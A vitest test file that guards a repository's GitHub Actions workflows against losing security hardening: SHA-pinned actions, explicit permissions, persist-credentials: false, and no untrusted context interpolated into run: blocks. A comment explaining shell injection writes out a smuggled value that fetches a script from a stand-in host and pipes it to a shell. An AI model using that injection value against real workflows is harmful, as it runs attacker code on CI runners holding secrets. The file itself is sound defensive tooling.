import { existsSync, readFileSync } from 'node:fs'
import { readdir } from 'node:fs/promises'
import { join } from 'node:path'
import { describe, expect, it } from 'vitest'

/**
 * Guard the CI/CD workflows against silently losing the hardening added 2026-08-12.
 *
 * WHY A TEST AND NOT A REVIEW. Every property below is invisible in the thing it
 * protects: a workflow with a mutable action tag, an over-permissioned token or an
 * interpolated shell string runs exactly as green as a hardened one. There is no
 * failing output to notice. The only moment the difference shows is the moment it
 * is being exploited, and by then the evidence is in someone else's logs.
 *
 * This repository has already been bitten by the general shape twice, both recorded
 * in CLAUDE.md: the alerting branch of uptime.yml was silently disabled for 17 days
 * because nothing exercised the path that only runs when things are broken, and
 * gitleaks lived in its own workflow where `needs:` could not reach it, so a commit
 * carrying a live key was scanned, flagged red, and deployed anyway. Both were
 * "obviously fine" until measured.
 *
 * WHY IT LIVES IN apps/cms. Same reasoning as claudeMd.test.ts and
 * mediaReferences.test.ts: this is a repo-wide check belonging to no app, and
 * apps/cms is the workspace that both runs vitest and carries node types.
 * `packages/shared` deliberately has neither, so node globals cannot leak into code
 * the Workers import.
 *
 * WHY LINE-BASED AND NOT A YAML PARSER. No workspace here depends on a YAML library;
 * the only copy present is a transitive of something else, and a guard that silently
 * stops running when an unrelated dependency is pruned is worse than no guard.
 * scripts/test-alert-shell.sh reads workflow shell back out with awk for the same
 * reason.
 */

const REPO_ROOT = join(import.meta.dirname, '..', '..', '..')
const WORKFLOW_DIR = join(REPO_ROOT, '.github', 'workflows')

async function workflowFiles(): Promise<string[]> {
  const names = await readdir(WORKFLOW_DIR)
  return names.filter((n) => n.endsWith('.yml') || n.endsWith('.yaml')).sort()
}

function read(name: string): string {
  return readFileSync(join(WORKFLOW_DIR, name), 'utf8')
}

/**
 * Lines belonging to a `run:` block — i.e. shell. Everything else in a workflow is
 * expression context, where `${{ }}` is evaluated by Actions rather than pasted into
 * a shell, and is therefore not an injection site.
 *
 * A `run:` block is the run line itself plus every following line indented deeper
 * than the key. Blank lines do not end it; a line at or below the key's indent does.
 */
function shellLines(source: string): { line: string; number: number }[] {
  const lines = source.split('\n')
  const out: { line: string; number: number }[] = []
  let blockIndent: number | null = null

  for (let i = 0; i < lines.length; i++) {
    const line = lines[i]!
    const runMatch = line.match(/^(\s*)(?:- )?run:/)

    if (runMatch) {
      blockIndent = runMatch[1]!.length
      out.push({ line, number: i + 1 })
      continue
    }
    if (blockIndent === null) continue
    if (line.trim() === '') continue

    const indent = line.length - line.trimStart().length
    if (indent > blockIndent) {
      out.push({ line, number: i + 1 })
    } else {
      blockIndent = null
    }
  }
  return out
}

describe('workflow hardening', () => {
  it('has workflows to check (the guard must not pass by finding nothing)', async () => {
    const files = await workflowFiles()
    expect(files.length).toBeGreaterThanOrEqual(6)
  })

  /**
   * A mutable tag (`@v7`) is a promise by the action's owner that they will not push
   * anything hostile to it. That promise held for `tj-actions/changed-files` right up
   * until March 2025, when a compromised token retagged every version to a payload
   * that dumped runner memory — including secrets — into build logs, across tens of
   * thousands of repositories at once. A commit SHA cannot be retagged.
   *
   * The `# vX.Y.Z` comment is not decoration: it is the only thing that makes the pin
   * legible in review, and Dependabot reads and rewrites it when it bumps the SHA.
   */
  it('pins every action to a full commit SHA with a version comment', async () => {
    const offenders: string[] = []

    for (const file of await workflowFiles()) {
      read(file)
        .split('\n')
        .forEach((line, i) => {
          const m = line.match(/^\s*(?:-\s*)?uses:\s*(\S+)(.*)$/)
          if (!m) return
          const ref = m[1]!
          const rest = m[2] ?? ''

          // Local composite actions (./.github/…) and docker:// refs are not tags.
          if (ref.startsWith('./') || ref.startsWith('docker://')) return

          const pinned = /@[0-9a-f]{40}$/.test(ref)
          const commented = /#\s*v\d+\.\d+\.\d+/.test(rest)

          if (!pinned) offenders.push(`${file}:${i + 1} not SHA-pinned -> ${ref}`)
          else if (!commented)
            offenders.push(`${file}:${i + 1} SHA-pinned but no "# vX.Y.Z" comment -> ${ref}`)
        })
    }

    expect(offenders, offenders.join('\n')).toEqual([])
  })

  /**
   * ⚠️ A `permissions:` block REPLACES the default grants rather than adding to them,
   * which is why this asserts PRESENCE and `contents`, not a maximal list. Getting
   * this wrong is the failure uptime.yml actually had: a block listing only
   * `issues: write` set `contents` to none, and `actions/checkout` on this private
   * repo then failed with "Repository not found" — a 404, so it read as a deleted
   * repository rather than a permissions problem, and the monitor was dead for ~23
   * hours while its failures looked like ordinary uptime alerts.
   */
  it('declares a top-level permissions block, including contents, in every workflow', async () => {
    const offenders: string[] = []

    for (const file of await workflowFiles()) {
      const source = read(file)
      // Top-level keys are at column 0.
      const hasTopLevel = /^permissions:\s*$/m.test(source)
      if (!hasTopLevel) {
        offenders.push(`${file}: no top-level "permissions:" block`)
        continue
      }
      const block = source.split(/^permissions:\s*$/m)[1] ?? ''
      const body = block.split(/\n(?=\S)/)[0] ?? ''
      if (!/^\s+contents:\s*(read|write)/m.test(body)) {
        offenders.push(
          `${file}: permissions block does not set "contents" — a block REPLACES the ` +
            `defaults, so omitting it sets contents:none and breaks actions/checkout ` +
            `with a 404 on this private repo`,
        )
      }
    }

    expect(offenders, offenders.join('\n')).toEqual([])
  })

  /**
   * `github.event.*` and `github.head_ref` are attacker-influenced strings. Inside a
   * `run:` block, `${{ }}` is textually substituted BEFORE the shell sees it, so a
   * value of `"; curl evil.sh | sh; #` executes. Passing it through `env:` and
   * referencing `"$VAR"` is inert no matter what the value contains.
   *
   * Found live in uptime.yml on 2026-08-12: `if [ "${{ github.event.inputs.target }}"
   * = "" ]` in a job holding GH_TOKEN. Only a write-access user could trigger it, so
   * it was never externally reachable — it is fixed, and pinned here, because the
   * shape is the bug and the next person to copy the block may be less lucky.
   *
   * `github.event_name` is deliberately NOT flagged: it is a fixed enum set by the
   * platform, not by any user.
   */
  it('never interpolates attacker-influenced context inside a run: block', async () => {
    const offenders: string[] = []
    const dangerous = /\$\{\{\s*github\.(event\.|head_ref)/

    for (const file of await workflowFiles()) {
      for (const { line, number } of shellLines(read(file))) {
        // Comments inside a run block are shell comments — still substituted, but
        // harmless, and this repo comments heavily. Skip pure comment lines.
        if (line.trim().startsWith('#')) continue
        if (dangerous.test(line)) {
          offenders.push(`${file}:${number} -> ${line.trim()}`)
        }
      }
    }

    expect(
      offenders,
      `Interpolated untrusted context into shell. Pass it via env: and use "$VAR":\n${offenders.join('\n')}`,
    ).toEqual([])
  })

  /**
   * `actions/checkout` writes the job's token into `.git/config` by default, where
   * any code the job later runs can read it. These jobs run `pnpm install`, a build
   * and three test suites — thousands of third-party packages. No workflow here
   * pushes, so nothing needs the credential to persist.
   */
  it('sets persist-credentials: false on every checkout', async () => {
    const offenders: string[] = []

    for (const file of await workflowFiles()) {
      const lines = read(file).split('\n')
      lines.forEach((line, i) => {
        if (!/^\s*-\s*uses:\s*actions\/checkout@/.test(line)) return
        // Look ahead within this step: stop at the next step (`- ` at same indent).
        const indent = line.length - line.trimStart().length
        let found = false
        for (let j = i + 1; j < lines.length; j++) {
          const next = lines[j]!
          if (next.trim() === '') continue
          const nextIndent = next.length - next.trimStart().length
          if (nextIndent <= indent && next.trimStart().startsWith('- ')) break
          if (nextIndent < indent) break
          if (/persist-credentials:\s*false/.test(next)) {
            found = true
            break
          }
        }
        if (!found) offenders.push(`${file}:${i + 1} checkout without persist-credentials: false`)
      })
    }

    expect(offenders, offenders.join('\n')).toEqual([])
  })

  /**
   * Every `pnpm <script>` a workflow invokes must exist in the package.json it
   * resolves against.
   *
   * This is the cheap half of a real failure mode: a script renamed in package.json
   * breaks CI at the step that runs it, which is minutes into a run and after a push,
   * rather than here in milliseconds. It also catches the reverse — a workflow step
   * copied between files that references a script the target package does not have.
   */
  it('only invokes pnpm scripts that exist', async () => {
    // pnpm's own subcommands, which are not package scripts.
    const BUILTINS = new Set([
      'install',
      'exec',
      'add',
      'remove',
      'update',
      'dlx',
      'why',
      'store',
      'config',
      'list',
      'audit',
      'publish',
      'pack',
      'link',
      'prune',
      'rebuild',
      'run',
    ])

    const scriptsOf = (pkgJsonPath: string): Set<string> => {
      if (!existsSync(pkgJsonPath)) return new Set()
      const pkg = JSON.parse(readFileSync(pkgJsonPath, 'utf8')) as {
        scripts?: Record<string, string>
      }
      return new Set(Object.keys(pkg.scripts ?? {}))
    }

    const rootScripts = scriptsOf(join(REPO_ROOT, 'package.json'))

    // name -> scripts, for every workspace package.
    const byName = new Map<string, Set<string>>()
    for (const dir of ['apps', 'packages', 'tools']) {
      const base = join(REPO_ROOT, dir)
      if (!existsSync(base)) continue
      for (const entry of await readdir(base)) {
        const p = join(base, entry, 'package.json')
        if (!existsSync(p)) continue
        const pkg = JSON.parse(readFileSync(p, 'utf8')) as { name?: string }
        if (pkg.name) byName.set(pkg.name, scriptsOf(p))
      }
    }

    const offenders: string[] = []
    const invocation =
      /\bpnpm\s+(?:(?:--filter|-F)\s+(\S+)\s+)?(?:(-r|--recursive)\s+)?(?:run\s+)?([a-z][\w:.-]*)/g

    for (const file of await workflowFiles()) {
      for (const { line, number } of shellLines(read(file))) {
        if (line.trim().startsWith('#')) continue
        for (const m of line.matchAll(invocation)) {
          const filter = m[1]
          const script = m[3]!
          if (BUILTINS.has(script)) continue

          const available = filter ? byName.get(filter) : rootScripts
          if (!available) {
            offenders.push(`${file}:${number} --filter ${filter} is not a workspace package`)
            continue
          }
          if (!available.has(script)) {
            offenders.push(
              `${file}:${number} pnpm ${filter ? `--filter ${filter} ` : ''}${script} — no such script`,
            )
          }
        }
      }
    }

    expect(offenders, offenders.join('\n')).toEqual([])
  })
})
